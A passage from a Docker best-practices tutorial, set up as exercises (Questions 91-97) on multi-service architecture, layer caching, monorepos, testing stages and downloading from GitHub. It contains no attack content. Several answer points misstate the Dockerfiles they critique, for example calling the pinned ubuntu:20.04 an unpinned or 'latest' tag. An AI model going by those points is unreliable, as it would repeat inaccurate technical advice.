# Shell is replaced!
```

**Why exec Matters:**

**1. Signal Handling:**
```
Without exec:
docker stop → SIGTERM to shell (PID 1) → shell might not forward → app keeps running

With exec:
docker stop → SIGTERM to app (PID 1) → app receives signal → graceful shutdown
```

**2. Process Management:**
```
Without exec: Shell and app both running
With exec: Only app running
```

**3. Clean Shutdown:**
```bash
docker stop myapp
# With exec: 10-second wait for graceful shutdown
# Without exec: Might need SIGKILL after timeout
```

**Entrypoint Pattern:**
```bash
#!/bin/bash
set -e  # Exit on error

# Initialization
echo "Doing setup..."
setup-commands

# Execute main command (replaces shell)
exec "$@"
```

**Complete Example:**
```bash
#!/bin/bash
set -e

# Functions
wait_for_service() {
  local host=$1
  local port=$2
  echo "Waiting for $host:$port..."
  while ! nc -z $host $port; do
    sleep 1
  done
  echo "$host:$port is ready!"
}

# Initialization
echo "==================================="
echo "Starting ${APP_NAME:-application}"
echo "Environment: ${APP_ENV:-production}"
echo "==================================="

# Wait for dependencies
if [ -n "$DB_HOST" ]; then
  wait_for_service $DB_HOST ${DB_PORT:-5432}
fi

if [ -n "$REDIS_HOST" ]; then
  wait_for_service $REDIS_HOST ${REDIS_PORT:-6379}
fi

# Run migrations if requested
if [ "$RUN_MIGRATIONS" = "true" ]; then
  echo "Running database migrations..."
  python manage.py migrate --noinput
fi

# Execute main command (replaces this script)
echo "Executing: $@"
exec "$@"
```

**Key Takeaways:**
1. **Always use exec** in entrypoint scripts
2. **exec replaces shell** with your command
3. **Better signal handling** with exec
4. **Cleaner process tree**
5. **Graceful shutdowns** work properly

---

## Questions 91-100: Complex Real-World Scenarios

### Question 91
**Dockerfile:**
```dockerfile
FROM node:16 AS frontend
WORKDIR /frontend
COPY frontend/package.json .
RUN npm install
COPY frontend/ .
RUN npm run build

FROM python:3.9 AS backend
WORKDIR /backend
COPY backend/requirements.txt .
RUN pip install -r requirements.txt
COPY backend/ .

FROM nginx:alpine
COPY --from=frontend /frontend/build /usr/share/nginx/html
COPY --from=backend /backend /app
COPY nginx.conf /etc/nginx/conf.d/default.conf
CMD ["nginx", "-g", "daemon off;"]
```

**Tasks:**
a. Identify all issues with this multi-service setup  
b. Provide correct architecture

**Solution:**

**a. Issues:**

1. **Major:** Trying to run nginx and Python app in one container (anti-pattern)
2. **Issue:** CMD only starts nginx, Python never runs
3. **Issue:** Violates single-process-per-container principle
4. **Issue:** No layer caching optimization in frontend/backend stages
5. **Issue:** Should use separate containers + orchestration

**Corrected Architecture:**

**frontend/Dockerfile:**
```dockerfile
FROM node:16-alpine AS build

WORKDIR /app

# Dependencies
COPY package*.json ./
RUN npm ci

# Build
COPY . .
RUN npm run build

# Production
FROM nginx:alpine

COPY --from=build /app/build /usr/share/nginx/html
COPY nginx.conf /etc/nginx/conf.d/default.conf

RUN adduser -D -u 1000 nginx-user && \
    chown -R nginx-user:nginx-user /usr/share/nginx/html

USER nginx-user

EXPOSE 8080

HEALTHCHECK CMD wget --no-verbose --tries=1 --spider http://localhost:8080/ || exit 1

CMD ["nginx", "-g", "daemon off;"]
```

**backend/Dockerfile:**
```dockerfile
FROM python:3.9-slim

WORKDIR /app

# Dependencies
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt gunicorn

# Application
COPY . .

# Non-root user
RUN useradd -m -u 1000 appuser && \
    chown -R appuser:appuser /app

USER appuser

EXPOSE 5000

HEALTHCHECK CMD python -c "import requests; requests.get('http://localhost:5000/health')"

CMD ["gunicorn", "--bind", "0.0.0.0:5000", "--workers", "4", "app:app"]
```

**docker-compose.yml:**
```yaml
version: '3.8'

services:
  frontend:
    build: ./frontend
    ports:
      - "80:8080"
    depends_on:
      - backend
    networks:
      - app-network
    restart: unless-stopped

  backend:
    build: ./backend
    ports:
      - "5000:5000"
    environment:
      - DATABASE_URL=postgresql://db:5432/myapp
      - REDIS_URL=redis://redis:6379
    depends_on:
      - db
      - redis
    networks:
      - app-network
    restart: unless-stopped

  db:
    image: postgres:14-alpine
    environment:
      - POSTGRES_DB=myapp
      - POSTGRES_USER=user
      - POSTGRES_PASSWORD_FILE=/run/secrets/db_password
    volumes:
      - postgres-data:/var/lib/postgresql/data
    networks:
      - app-network
    secrets:
      - db_password
    restart: unless-stopped

  redis:
    image: redis:7-alpine
    volumes:
      - redis-data:/data
    networks:
      - app-network
    restart: unless-stopped

networks:
  app-network:
    driver: bridge

volumes:
  postgres-data:
  redis-data:

secrets:
  db_password:
    file: ./secrets/db_password.txt
```

**Explanation for Beginners:**

**Microservices Architecture:**

**Wrong: Monolithic Container**
```
One container with:
- Nginx (frontend server)
- Python (backend API)
- Maybe database?

Problems:
- Can't scale services independently
- One crash affects everything
- Hard to update individual services
- Difficult to debug
```

**Right: Separate Containers**
```
Container 1: Frontend (nginx)
Container 2: Backend (Python API)
Container 3: Database (PostgreSQL)
Container 4: Cache (Redis)

Benefits:
- Scale each independently
- Isolated failures
- Easy updates
- Clear separation of concerns
```

**Why Separate Containers:**

**Scaling:**
```yaml
services:
  frontend:
    deploy:
      replicas: 2       # 2 frontend instances
  backend:
    deploy:
      replicas: 5       # 5 backend instances
  db:
    deploy:
      replicas: 1       # 1 database
```

**Updates:**
```bash
# Update only backend
docker-compose up -d --no-deps --build backend

# Frontend keeps running
```

**Resource Allocation:**
```yaml
services:
  frontend:
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 256M
  backend:
    deploy:
      resources:
        limits:
          cpus: '2'
          memory: 2G
```

**Key Principles:**
1. **One process per container**
2. **Use orchestration** (docker-compose, Kubernetes)
3. **Separate concerns** (frontend, backend, database)
4. **Enable independent scaling**
5. **Isolate failures**
6. **Simplify updates**

---

### Question 92
**Dockerfile:**
```dockerfile
FROM ubuntu:20.04
RUN apt-get update
RUN apt-get install -y python3
RUN apt-get install -y python3-pip
RUN pip3 install flask
RUN apt-get install -y curl
RUN apt-get install -y vim
COPY . /app
WORKDIR /app
CMD ["python3", "app.py"]
```

**Tasks:**
a. Identify inefficiencies and issues  
b. Optimize completely

**Solution:**

**a. Issues:**

1. **Issue:** Multiple RUN commands (creates many layers)
2. **Issue:** No cleanup of apt cache
3. **Issue:** Installing unnecessary packages (vim)
4. **Issue:** Using Ubuntu when Alpine would work
5. **Issue:** No layer caching strategy
6. **Issue:** No non-root user
7. **Issue:** Latest Ubuntu tag (should pin version)

**Image layers created: 7+** (inefficient!)

**b. Optimized Dockerfile:**

**Option 1: Basic optimization:**
```dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

RUN useradd -m appuser && chown -R appuser:appuser /app
USER appuser

EXPOSE 5000

CMD ["python", "app.py"]
```

**Image layers: 3-4** (much better!)

**Option 2: Production-ready:**
```dockerfile
FROM python:3.9-slim AS base

# Install system dependencies if needed
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
    libpq5 \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Dependencies layer
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt gunicorn

# Application layer
COPY . .

# Security
RUN useradd -m -u 1000 appuser && \
    chown -R appuser:appuser /app

USER appuser

EXPOSE 8000

HEALTHCHECK --interval=30s --timeout=3s \
    CMD python -c "import requests; requests.get('http://localhost:8000/health')"

CMD ["gunicorn", "--bind", "0.0.0.0:8000", "--workers", "4", "app:app"]
```

**Explanation for Beginners:**

**Layer Optimization:**

**Bad: Many layers**
```dockerfile
FROM ubuntu:20.04
RUN apt-get update                    # Layer 1
RUN apt-get install -y python3        # Layer 2
RUN apt-get install -y python3-pip    # Layer 3
RUN pip3 install flask                # Layer 4
RUN apt-get install -y curl           # Layer 5
# 5 layers just for setup!
```

**Good: Combined layers**
```dockerfile
FROM python:3.9-slim
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
    curl \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*
# 1 layer for setup!
```

**Optimization Techniques:**

**1. Combine RUN commands:**
```dockerfile
# Bad
RUN apt-get update
RUN apt-get install -y package1
RUN apt-get install -y package2

# Good
RUN apt-get update && \
    apt-get install -y \
    package1 \
    package2 \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*
```

**2. Use appropriate base image:**
```dockerfile
# Bad: 70MB base + installations
FROM ubuntu:20.04
RUN apt-get install python3

# Good: 150MB purpose-built
FROM python:3.9-slim
```

**3. Clean up in same layer:**
```dockerfile
RUN apt-get update && apt-get install -y package && \
    apt-get clean && rm -rf /var/lib/apt/lists/*
# Cleanup in same layer reduces final size
```

**4. Order for caching:**
```dockerfile
# Dependencies (rarely change)
COPY requirements.txt .
RUN pip install -r requirements.txt

# Application code (changes often)
COPY . .
```

**5. Use --no-install-recommends:**
```dockerfile
RUN apt-get install -y --no-install-recommends package
# Only installs package, not suggested packages
```

**6. Use multi-stage builds:**
```dockerfile
FROM python:3.9 AS builder
RUN pip install --user -r requirements.txt

FROM python:3.9-slim
COPY --from=builder /root/.local /root/.local
```

**Size Comparison:**

**Unoptimized:**
```
Image size: 800MB
Layers: 15+
Build time: 5 minutes
```

**Optimized:**
```
Image size: 200MB
Layers: 5
Build time: 1 minute (with caching)
```

---

### Question 93
**Scenario:** You have a monorepo with multiple services:

```
project/
├── services/
│   ├── api/
│   ├── worker/
│   └── scheduler/
├── shared/
│   └── lib/
└── Dockerfile
```

**Dockerfile:**
```dockerfile
FROM python:3.9
COPY . /app
WORKDIR /app/services/api
RUN pip install -r requirements.txt
CMD ["python", "server.py"]
```

**Tasks:**
a. What's problematic about this approach?  
b. Design proper multi-service Dockerfiles

**Solution:**

**a. Problems:**

1. **Issue:** Copies entire monorepo into every service image
2. **Issue:** API image contains worker and scheduler code (unnecessary)
3. **Issue:** Large images (contains all services' code)
4. **Issue:** Security risk (all code accessible in every container)
5. **Issue:** Difficult to manage dependencies per service

**b. Proper Architecture:**

**services/api/Dockerfile:**
```dockerfile
FROM python:3.9-slim AS base

WORKDIR /app

# Copy shared library
COPY shared/lib /app/shared/lib

# Copy API requirements
COPY services/api/requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy API code only
COPY services/api .

# Non-root user
RUN useradd -m appuser && chown -R appuser:appuser /app
USER appuser

EXPOSE 8000

CMD ["gunicorn", "--bind", "0.0.0.0:8000", "server:app"]
```

**services/worker/Dockerfile:**
```dockerfile
FROM python:3.9-slim

WORKDIR /app

# Copy shared library
COPY shared/lib /app/shared/lib

# Copy worker requirements
COPY services/worker/requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy worker code only
COPY services/worker .

RUN useradd -m appuser && chown -R appuser:appuser /app
USER appuser

CMD ["celery", "-A", "tasks", "worker", "--loglevel=info"]
```

**services/scheduler/Dockerfile:**
```dockerfile
FROM python:3.9-slim

WORKDIR /app

# Copy shared library
COPY shared/lib /app/shared/lib

# Copy scheduler requirements
COPY services/scheduler/requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy scheduler code only
COPY services/scheduler .

RUN useradd -m appuser && chown -R appuser:appuser /app
USER appuser

CMD ["celery", "-A", "tasks", "beat", "--loglevel=info"]
```

**Build from monorepo root:**
```bash
# Build each service
docker build -f services/api/Dockerfile -t api:latest .
docker build -f services/worker/Dockerfile -t worker:latest .
docker build -f services/scheduler/Dockerfile -t scheduler:latest .
```

**docker-compose.yml:**
```yaml
version: '3.8'

services:
  api:
    build:
      context: .
      dockerfile: services/api/Dockerfile
    ports:
      - "8000:8000"
    environment:
      - DATABASE_URL=postgresql://db:5432/myapp
      - REDIS_URL=redis://redis:6379
    depends_on:
      - db
      - redis
    networks:
      - backend

  worker:
    build:
      context: .
      dockerfile: services/worker/Dockerfile
    environment:
      - DATABASE_URL=postgresql://db:5432/myapp
      - REDIS_URL=redis://redis:6379
    depends_on:
      - db
      - redis
    networks:
      - backend
    deploy:
      replicas: 3

  scheduler:
    build:
      context: .
      dockerfile: services/scheduler/Dockerfile
    environment:
      - REDIS_URL=redis://redis:6379
    depends_on:
      - redis
    networks:
      - backend

  db:
    image: postgres:14-alpine
    volumes:
      - postgres-data:/var/lib/postgresql/data
    environment:
      - POSTGRES_DB=myapp
      - POSTGRES_USER=user
      - POSTGRES_PASSWORD_FILE=/run/secrets/db_password
    networks:
      - backend
    secrets:
      - db_password

  redis:
    image: redis:7-alpine
    volumes:
      - redis-data:/data
    networks:
      - backend

networks:
  backend:
    driver: bridge

volumes:
  postgres-data:
  redis-data:

secrets:
  db_password:
    file: ./secrets/db_password.txt
```

**Explanation for Beginners:**

**Monorepo Strategies:**

**Strategy 1: Service-Specific Dockerfiles (recommended):**
```
Each service has its own Dockerfile
Build context is monorepo root
Each image contains only what it needs
```

**Strategy 2: Shared base image:**
```dockerfile
# base.Dockerfile
FROM python:3.9-slim AS base
COPY shared/lib /app/shared/lib
COPY shared/requirements.txt .
RUN pip install -r requirements.txt

# services/api/Dockerfile
FROM myorg/base:latest
COPY services/api .
CMD ["gunicorn", "server:app"]
```

**Strategy 3: Multi-stage in one file:**
```dockerfile
# Build shared
FROM python:3.9-slim AS shared
COPY shared/lib /app/shared/lib

# API service
FROM shared AS api
COPY services/api /app/api
CMD ["python", "/app/api/server.py"]

# Worker service
FROM shared AS worker
COPY services/worker /app/worker
CMD ["python", "/app/worker/tasks.py"]
```

```bash
docker build --target api -t api .
docker build --target worker -t worker .
```

**Best Practices for Monorepos:**
1. **Separate Dockerfiles per service**
2. **Build context = monorepo root**
3. **Copy only what each service needs**
4. **Share common dependencies via base image**
5. **Use docker-compose for orchestration**
6. **.dockerignore at root level**

**.dockerignore:**
```
**/__pycache__
**/*.pyc
**/.git
**/.env
**/node_modules
.vscode
.idea
*.md
tests/
docs/
```

---

### Question 94
**Dockerfile:**
```dockerfile
FROM node:16 AS build
WORKDIR /app
COPY package.json .
RUN npm install
COPY . .
RUN npm run build
RUN npm run test

FROM nginx:alpine
COPY --from=build /app/dist /usr/share/nginx/html
```

**Tasks:**
a. What happens if tests fail?  
b. How to handle testing properly?

**Solution:**

**a. What Happens:**

1. **If tests fail:** Docker build fails completely
2. **Result:** Can't build image even if code is fine
3. **Problem:** Tests blocking image creation
4. **Issue:** Long build times (tests run every build)

**b. Proper Test Handling:**

**Option 1: Separate test stage:**
```dockerfile
# Build stage
FROM node:16-alpine AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

# Test stage (optional, run separately)
FROM build AS test
RUN npm run test
RUN npm run lint

# Production (doesn't depend on test)
FROM nginx:alpine
COPY --from=build /app/dist /usr/share/nginx/html
EXPOSE 80
CMD ["nginx", "-g", "daemon off;"]
```

**Build commands:**
```bash
# Build production (tests don't run)
docker build -t myapp:prod .

# Run tests separately
docker build --target test -t myapp:test .
```

**Option 2: CI/CD approach:**
```dockerfile
FROM node:16-alpine AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
# Don't run tests here!
RUN npm run build

FROM nginx:alpine
COPY --from=build /app/dist /usr/share/nginx/html
CMD ["nginx", "-g", "daemon off;"]
```

**.github/workflows/ci.yml:**
```yaml
name: CI/CD

on: [push]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm ci
      - run: npm run lint
      - run: npm run test
      - run: npm run build

  build-image:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Build Docker image
        run: docker build -t myapp:${{ github.sha }} .
      - name: Push image
        run: docker push myapp:${{ github.sha }}
```

**Option 3: Test in separate container:**
```dockerfile
# Dockerfile.test
FROM node:16-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
CMD ["npm", "run", "test"]

# Dockerfile (production)
FROM node:16-alpine AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

FROM nginx:alpine
COPY --from=build /app/dist /usr/share/nginx/html
CMD ["nginx", "-g", "daemon off;"]
```

**Run tests:**
```bash
docker build -f Dockerfile.test -t myapp:test .
docker run myapp:test
# Tests run, but don't block image build
```

**Explanation for Beginners:**

**Test Strategies:**

**1. Separate Stage (optional target):**
```dockerfile
FROM base AS test
RUN npm run test

FROM base AS prod
# Production build
```
```bash
# CI/CD runs tests
docker build --target test .

# Deployment builds production
docker build --target prod .
```

**2. External Testing:**
```bash
# Run tests before building image
npm test
if [ $? -eq 0 ]; then
  docker build -t myapp .
fi
```

**3. CI/CD Pipeline:**
```
Step 1: Checkout code
Step 2: Run tests (npm test, pytest, etc.)
Step 3: If tests pass → Build Docker image
Step 4: Push image to registry
Step 5: Deploy
```

**Why Separate Tests from Build:**
1. **Faster deployments:** Don't run tests during build
2. **Independent failures:** Test failures don't block emergency deploys
3. **Better caching:** Production builds cached independently
4. **Clearer process:** Tests in CI, builds in CD
5. **Smaller images:** Test dependencies not included

**Production Best Practice:**
```
Development:
├── Write code
├── Run tests locally (fast feedback)
└── Commit

CI Pipeline:
├── Run tests (npm test, pytest)
├── Run linting (eslint, pylint)
├── Run security scans
└── If all pass → trigger build

CD Pipeline:
├── Build Docker image (no tests!)
├── Push to registry
├── Deploy to staging
├── Smoke tests on staging
└── Deploy to production
```

---

### Question 95
**Complex Scenario:**

```dockerfile
FROM ubuntu:20.04
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update
RUN apt-get install -y python3 python3-pip nodejs npm postgresql-client redis-tools
RUN pip3 install flask celery sqlalchemy redis psycopg2-binary
RUN npm install -g pm2
COPY . /app
WORKDIR /app
RUN chmod 777 -R /app
EXPOSE 5000 6379 5432
CMD pm2 start app.py && celery worker && npm start
```

**Tasks:**
a. Identify ALL problems (at least 10)  
b. Design proper architecture

**Solution:**

**a. Problems Identified:**

1. **Multiple services in one container** (Flask, Celery, npm)
2. **Installing database/redis clients** (should use separate containers)
3. **Multiple RUN commands** (inefficient layers)
4. **chmod 777** (dangerous permissions)
5. **No package cleanup**
6. **Wrong EXPOSE** (6379 and 5432 are external services)
7. **Shell form CMD with &&** (doesn't work as expected)
8. **Running as root**
9. **No version pinning** (ubuntu:latest, no package versions)
10. **No WORKDIR before COPY**
11. **No .dockerignore**
12. **Mixing package managers** (apt, pip, npm)
13. **No health checks**
14. **DEBIAN_FRONTEND should be ARG, not ENV**
15. **No multi-stage build**

**b. Proper Architecture:**

**api/Dockerfile:**
```dockerfile
FROM python:3.9-slim

ARG DEBIAN_FRONTEND=noninteractive

# Install only necessary system dependencies
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
    libpq5 \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Python dependencies
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt gunicorn

# Application
COPY . .

# Non-root user
RUN useradd -m -u 1000 appuser && \
    chown -R appuser:appuser /app
USER appuser

EXPOSE 5000

HEALTHCHECK CMD python -c "import requests; requests.get('http://localhost:5000/health')"

CMD ["gunicorn", "--bind", "0.0.0.0:5000", "--workers", "4", "app:app"]
```

**worker/Dockerfile:**
```dockerfile
FROM python:3.9-slim

WORKDIR /app

# Python dependencies
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Application
COPY . .

# Non-root user
RUN useradd -m -u 1000 appuser && \
    chown -R appuser:appuser /app
USER appuser

CMD ["celery", "-A", "tasks", "worker", "--loglevel=info", "--concurrency=4"]
```

**frontend/Dockerfile:**
```dockerfile
FROM node:16-alpine AS build

WORKDIR /app

COPY package*.json ./
RUN npm ci

COPY . .
RUN npm run build

FROM nginx:alpine

COPY --from=build /app/build /usr/share/nginx/html
COPY nginx.conf /etc/nginx/conf.d/default.conf

RUN chown -R nginx:nginx /usr/share/nginx/html

USER nginx

EXPOSE 8080

HEALTHCHECK CMD wget --no-verbose --tries=1 --spider http://localhost:8080/ || exit 1

CMD ["nginx", "-g", "daemon off;"]
```

**docker-compose.yml:**
```yaml
version: '3.8'

services:
  api:
    build: ./api
    ports:
      - "5000:5000"
    environment:
      - DATABASE_URL=postgresql://user:pass@db:5432/myapp
      - REDIS_URL=redis://redis:6379
    depends_on:
      - db
      - redis
    networks:
      - backend
    restart: unless-stopped
    deploy:
      resources:
        limits:
          cpus: '1'
          memory: 512M

  worker:
    build: ./worker
    environment:
      - DATABASE_URL=postgresql://user:pass@db:5432/myapp
      - REDIS_URL=redis://redis:6379
    depends_on:
      - db
      - redis
    networks:
      - backend
    restart: unless-stopped
    deploy:
      replicas: 3
      resources:
        limits:
          cpus: '0.5'
          memory: 256M

  frontend:
    build: ./frontend
    ports:
      - "80:8080"
    depends_on:
      - api
    networks:
      - backend
    restart: unless-stopped

  db:
    image: postgres:14-alpine
    environment:
      - POSTGRES_DB=myapp
      - POSTGRES_USER=user
      - POSTGRES_PASSWORD_FILE=/run/secrets/db_password
    volumes:
      - postgres-data:/var/lib/postgresql/data
    networks:
      - backend
    restart: unless-stopped
    secrets:
      - db_password

  redis:
    image: redis:7-alpine
    command: redis-server --appendonly yes
    volumes:
      - redis-data:/data
    networks:
      - backend
    restart: unless-stopped

networks:
  backend:
    driver: bridge

volumes:
  postgres-data:
  redis-data:

secrets:
  db_password:
    file: ./secrets/db_password.txt
```

**Explanation for Beginners:**

**Microservices Best Practices:**

**1. One Service Per Container:**
- API in one container
- Worker in another
- Frontend in another
- Databases separate

**2. Proper Dependency Management:**
- Don't install database clients in app container
- Connect via network
- Use official database images

**3. Security:**
- Run as non-root
- Proper permissions (not 777!)
- Secrets via files/vault
- Minimal base images

**4. Resource Management:**
- Set CPU/memory limits
- Scale services independently
- Monitor resource usage

**5. Orchestration:**
- Use docker-compose for local development
- Use Kubernetes for production
- Implement health checks
- Configure restart policies

---

### Question 96
**Dockerfile:**
```dockerfile
FROM node:16
WORKDIR /app
COPY package.json .
RUN npm install
COPY . .
RUN npm test
RUN npm run build
CMD ["node", "dist/index.js"]
```

**Tasks:**
a. What happens if you rebuild after only changing source code?  
b. Optimize for layer caching

**Solution:**

**a. What Happens:**

1. **Issue:** npm test and npm run build rerun every time
2. **Issue:** Even if only source code changed
3. **Issue:** Slow builds
4. **Issue:** Wastes CI/CD time

**Layer Caching Behavior:**
```
Build 1:
✓ FROM node:16 (cached)
✓ WORKDIR /app (cached)
✓ COPY package.json (cached)
✓ RUN npm install (cached)
✗ COPY . . (changed - invalidates cache from here)
✗ RUN npm test (runs again)
✗ RUN npm run build (runs again)
```

**b. Optimized for Caching:**

```dockerfile
FROM node:16-alpine AS dependencies
WORKDIR /app
COPY package*.json ./
RUN npm ci

FROM node:16-alpine AS build
WORKDIR /app
COPY --from=dependencies /app/node_modules ./node_modules
COPY package*.json ./
COPY src/ ./src/
COPY public/ ./public/
COPY tsconfig.json babel.config.js ./
RUN npm run build

FROM node:16-alpine AS test
WORKDIR /app
COPY --from=dependencies /app/node_modules ./node_modules
COPY package*.json ./
COPY src/ ./src/
COPY tests/ ./tests/
RUN npm test

FROM node:16-alpine
WORKDIR /app
ENV NODE_ENV=production
COPY package*.json ./
RUN npm ci --only=production
COPY --from=build /app/dist ./dist
RUN adduser -D -u 1000 appuser && chown -R appuser:appuser /app
USER appuser
EXPOSE 3000
HEALTHCHECK CMD node healthcheck.js || exit 1
CMD ["node", "dist/index.js"]
```

**Build Strategy:**
```bash
# CI/CD: Run tests
docker build --target test -t myapp:test .

# Production: Skip tests
docker build -t myapp:prod .
```

**Explanation for Beginners:**

**Layer Caching Rules:**
1. Each instruction creates a layer
2. Layers are cached if nothing changed
3. Once cache is invalidated, all subsequent layers rebuild
4. Order instructions from least to most frequently changing

**Optimization Strategy:**

**Bad Order (no caching):**
```dockerfile
COPY . .              # Changes often
RUN npm install       # Always reruns
RUN npm test          # Always reruns
RUN npm run build     # Always reruns
```

**Good Order (optimal caching):**
```dockerfile
COPY package*.json ./  # Rarely changes
RUN npm ci            # Cached most of the time
COPY . .              # Changes often
RUN npm run build     # Only reruns if code changed
```

**Multi-Stage for Testing:**
```dockerfile
# Dependencies stage (rarely changes)
FROM node:16 AS deps
COPY package*.json ./
RUN npm ci

# Build stage (changes when code changes)
FROM deps AS build
COPY . .
RUN npm run build

# Test stage (optional, run separately)
FROM deps AS test
COPY . .
RUN npm test
```

**Cache Invalidation Points:**
```
✓ FROM node:16        - Rarely changes
✓ WORKDIR /app        - Never changes
✓ COPY package.json   - Changes when deps change
✓ RUN npm install     - Cached if package.json unchanged
✗ COPY . .            - Changes on every commit
✗ Everything after this reruns
```

---

### Question 97
**Dockerfile:**
```dockerfile
FROM python:3.9
WORKDIR /app
ADD https://github.com/user/repo/archive/main.zip /tmp/
RUN unzip /tmp/main.zip -d /app
RUN rm /tmp/main.zip
COPY config.py .
CMD ["python", "app.py"]
```

**Tasks:**
a. What are the problems with using ADD for GitHub downloads?  
b. Provide a better approach

**Solution:**

**a. Problems:**

1. **Issue:** ADD caches the download forever (doesn't re-check)
2. **Issue:** Can't verify download integrity
3. **Issue:** Multiple layers for download/extract/cleanup
4. **Issue:** No error handling
5. **Issue:** Downloading from main branch (not reproducible)
6. **Issue:** Using ADD for URLs is deprecated pattern

**What Happens:**
```
First build:
ADD downloads file → cached

Later builds:
ADD uses cached file → never re-downloads
Even if GitHub repo updated!
```

**b. Better Approaches:**

**Option 1: Use specific commit/tag:**
```dockerfile
FROM python:3.9-slim

ARG REPO_VERSION=v1.2.3
ARG REPO_SHA256=abc123...

WORKDIR /app

# Install dependencies
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
    curl \
    unzip \
    && rm -rf /var/lib/apt/lists/*

# Download and verify
RUN curl -fSL https://github.com/user/repo/archive/${REPO_VERSION}.zip -o repo.zip && \
    echo "${REPO_SHA256}  repo.zip" | sha256sum -c - && \
    unzip repo.zip && \
    mv repo-${REPO_VERSION}/* . && \
    rm -rf repo.zip repo-${REPO_VERSION} && \
    apt-get purge -y curl unzip

# Copy configuration
COPY config.py .

# Non-root user
RUN useradd -m appuser && chown -R appuser:appuser /app
USER appuser

CMD ["python", "app.py"]
```

**Option 2: Git clone specific version:**
```dockerfile
FROM python:3.9-slim AS source

ARG REPO_VERSION=v1.2.3

RUN apt-get update && \
    apt-get install -y --no-install-recommends git && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /tmp

RUN git clone --depth 1 --branch ${REPO_VERSION} \
    https://github.com/user/repo.git app

FROM python:3.9-slim

WORKDIR /app

COPY --from=source /tmp/app .
COPY config.py .

RUN useradd -m appuser && chown -R appuser:appuser /app
USER appuser

CMD ["python", "app.py"]
```

**Option 3: Multi-stage with build arg:**
```dockerfile
FROM python:3.9-slim AS downloader

ARG REPO_URL=https://github.com/user/repo/archive/refs/tags/v1.2.3.zip
ARG EXPECTED_SHA256

RUN apt-get update && \
    apt-get install -y --no-install-recommends \
    curl \
    unzip \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /tmp

RUN curl -fSL ${REPO_URL} -o repo.zip && \
    if [ -n "$EXPECTED_SHA256" ]; then \
      echo "${EXPECTED_SHA256}  repo.zip" | sha256sum -c -; \
    fi && \
    unzip repo.zip -d /tmp/extracted

FROM python:3.9-slim

WORKDIR /app

COPY --from=downloader /tmp/extracted/*/ .
COPY config.py .

RUN pip install --no-cache-dir -r requirements.txt

RUN useradd -m -u 1000 appuser && \
    chown -R appuser:appuser /app
USER appuser

EXPOSE 8000

HEALTHCHECK CMD python -c "import requests; requests.get('http://localhost:8000/health')"

CMD ["python", "app.py"]
```

**Build Command:**
```bash
docker build \
  --build-arg REPO_VERSION=v1.2.3 \
  --build-arg REPO_SHA256=abc123... \
  -t myapp:v1.2.3 \
  .
```

**Explanation for Beginners:**

**Problems with ADD for URLs:**

**1. Caching:**
```dockerfile
ADD https://example.com/file.zip /app/
# First build: Downloads file
# Subsequent builds: Uses cached layer forever
# Even if file changed on server!
```

**2. No verification:**
```dockerfile
ADD https://example.com/file.zip /app/
# No checksum verification
# Could download corrupted/malicious file
```

**3. No error handling:**
```dockerfile
ADD https://example.com/file.zip /app/
# If download fails, build fails
# No control over retry logic
```

**Better: Use RUN with curl:**
```dockerfile
RUN curl -fSL https://example.com/file.zip -o file.zip && \
    echo "expected-hash  file.zip" | sha256sum -c - && \
    unzip file.zip && \
    rm file.zip
```

**Benefits:**
- Explicit error handling (-f flag)
- Checksum verification
- Combined in one layer
- More control over process

**GitHub Best Practices:**

**Bad: Using main/master branch:**
```dockerfile
ADD https://github.com/user/repo/archive/main.zip /app/
# Gets latest code (non-reproducible)
# Different builds get different code
```

**Good: Using specific tag/commit:**
```dockerfile
ARG REPO_VERSION=v1.2.3
RUN curl -L https://github.com/user/repo/archive/${REPO_VERSION}.zip -o repo.zip
# Reproducible builds
# Same version every time
```

**Complete Example:**
```dockerfile
FROM python:3.9-slim AS base

# Build arguments
ARG GITHUB_REPO=user/repo
ARG GITHUB_REF=v1.2.3
ARG ARCHIVE_SHA256

# Install tools
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
    curl \
    ca-certificates \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /tmp

# Download from GitHub
RUN curl -fSL \
    https://github.com/${GITHUB_REPO}/archive/refs/tags/${GITHUB_REF}.tar.gz \
    -o source.tar.gz && \
    # Verify checksum if provided
    if [ -n "$ARCHIVE_SHA256" ]; then \
      echo "${ARCHIVE_SHA256}  source.tar.gz" | sha256sum -c -; \
    fi && \
    # Extract
    tar -xzf source.tar.gz && \
    # Move to /app
    mv ${GITHUB_REPO##*/}-*/* /app/ && \
    # Cleanup
    rm -rf source.tar.gz ${GITHUB_REPO##*/}-*

FROM python:3.9-slim

WORKDIR /app

# Copy downloaded source
COPY --from=base /app .

# Install dependencies
RUN pip install --no-cache-dir -r requirements.txt

# Security
RUN useradd -m -u 1000 appuser && \
    chown -R appuser:appuser /app
USER appuser

